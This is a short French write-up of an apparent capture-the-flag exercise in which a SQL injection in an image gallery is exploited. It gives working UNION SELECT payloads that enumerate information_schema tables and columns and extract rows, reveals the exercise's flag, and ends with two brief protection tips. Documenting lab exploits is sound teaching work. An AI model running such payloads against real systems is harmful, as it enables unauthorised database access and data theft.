# Vulnérabilité: Injection SQL dans la galerie d'images

## Découverte

Nous avons identifié que la galerie d'images était vulnérable à l'injection SQL.

### Exploitation

1. Identification des tables disponibles:
```sql
1 UNION SELECT table_name, NULL FROM information_schema.tables --
```

2. Récupération des colonnes de la table d'images:
```sql
1 UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name=0x6C6973745F696D61676573 --
```

3. Structure découverte de la table `list_images`:
   - id
   - url
   - title
   - comment

4. Extraction des données sensibles:
```sql
1 UNION SELECT url, comment FROM list_images WHERE url=0x626f726e746f7365632e64646e732e6e65742f696d616765732e706e67 --
```

5. Résultat: extraction du flag "albatroz" qui, une fois converti en SHA256, donne le flag final.

## Protection
- Implémenter la validation des entrées
- Échapper les caractères spéciaux SQL
